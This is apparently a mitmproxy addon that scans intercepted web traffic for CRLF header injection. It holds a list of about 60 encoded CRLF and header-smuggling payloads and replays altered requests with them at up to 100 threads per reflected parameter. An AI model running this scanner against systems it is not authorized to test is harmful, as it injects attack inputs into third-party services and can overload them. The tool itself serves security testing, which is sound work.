from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor

class crlfFunction:
    def __init__(self):
        self.flow_dir_crlf = "crlf_flows"
        os.makedirs(self.flow_dir_crlf, exist_ok=True)
        self.alteration_indicators_crlf = [
    "%0AHeader-Test:BLATRUC",
    "%0A%20Header-Test:BLATRUC",
    "%20%0AHeader-Test:BLATRUC",
    "%23%OAHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "%3F%0AHeader-Test:BLATRUC",
    "crlf%0AHeader-Test:BLATRUC",
    "crlf%0A%20Header-Test:BLATRUC",
    "crlf%20%0AHeader-Test:BLATRUC",
    "crlf%23%OAHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "crlf%3F%0AHeader-Test:BLATRUC",
    "%0DHeader-Test:BLATRUC",
    "%0D%20Header-Test:BLATRUC",
    "%20%0DHeader-Test:BLATRUC",
    "%23%0DHeader-Test:BLATRUC",
    "%23%0AHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "%3F%0DHeader-Test:BLATRUC",
    "crlf%0DHeader-Test:BLATRUC",
    "crlf%0D%20Header-Test:BLATRUC",
    "crlf%20%0DHeader-Test:BLATRUC",
    "crlf%23%0DHeader-Test:BLATRUC",
    "crlf%23%0AHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "crlf%3F%0DHeader-Test:BLATRUC",
    "%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%20Header-Test:BLATRUC",
    "%20%0D%0AHeader-Test:BLATRUC",
    "%23%0D%0AHeader-Test:BLATRUC",
    "\\r\\nHeader-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "%5cr%5cnHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "%3F%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0A%20Header-Test:BLATRUC",
    "crlf%20%0D%0AHeader-Test:BLATRUC",
    "crlf%23%0D%0AHeader-Test:BLATRUC",
    "crlf\\r\\nHeader-Test:BLATRUC",
    "crlf%5cr%5cnHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "crlf%3F%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%09Header-Test:BLATRUC",
    "crlf%0D%0A%09Header-Test:BLATRUC",
    "%250AHeader-Test:BLATRUC",
    "%25250AHeader-Test:BLATRUC",
    "%%0A0AHeader-Test:BLATRUC",
    "%25%30AHeader-Test:BLATRUC",
    "%25%30%61Header-Test:BLATRUC",
    "%u000AHeader-Test:BLATRUC",
    "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC",
    "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC",
    "/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
]
        self.altered_header_crlf = "x-altered-crlf"

    def response(self, flow: http.HTTPFlow) -> None:

        if self.altered_header_crlf in flow.request.headers:
            self.check_altered_reflection_crlf(flow)
            return

        if flow.request.method == "GET":
            self.process_parameters_crlf(flow, flow.request.query)
        elif flow.request.method == "POST":
            self.process_post_request_crlf(flow)

    def process_post_request_crlf(self, flow):

        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            self.process_parameters_crlf(flow, params)
        elif "application/json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):
                    self.process_parameters_crlf(flow, params)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    def process_parameters_crlf(self, flow, params):
        def process_value(param, value):
            
            if isinstance(value, str):
                self.escaped_value = value
                # Your existing logic for using escaped_value
            elif isinstance(value, list):
                # If the value is a list, process each item
                value = value[0]
                self.escaped_value = value
            elif isinstance(value, dict):
                # If the value is a dict, recursively process each key-value pair
                for key, val in value.items():
                    process_value(f"{param}[{key}]", val)  # Adjust the param name as needed
                    self.escaped_value = val
            else:
                # Optionally handle other non-string types or log them
                ctx.log.info(f"Unhandled '{value}' type for param '{param}': {type(value)}")
                value = str(value)
            
                # Define patterns to search for in the response body
            if self.escaped_value in f"{flow.response.headers}":
                self.handle_reflection(flow, param, self.escaped_value)
            
        for param, value in params.items():

            process_value(param, value)
            

    def handle_reflection(self, flow, param, value):
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Logic to handle the reflection, e.g., logging, altering, and replaying
            for indicator in self.alteration_indicators_crlf:
                executor.submit(self.alter_and_replay_crlf, flow, param, value, indicator)
    def alter_and_replay_crlf(self, original_flow, param, original_value, indicator):
        altered_value = original_value + indicator
        altered_flow = self.alter_request_crlf(original_flow, param, altered_value)
        if altered_flow:
            ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request_crlf(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if isinstance(body, dict):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header_crlf] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection_crlf(self, flow):
        # Checks if the CRLF payloads are reflected in the response headers.
        for header, value in flow.response.headers.items():
            if "header-test" in header:
                ctx.log.info(f"CRLF Injection Detected: {flow.request.url}")
                self.save_flow_crlf(flow)
        

    def save_flow_crlf(self, flow):
        filename = os.path.join(self.flow_dir_crlf, f"{flow.request.method}_captured_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved crlf flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [crlfFunction()]
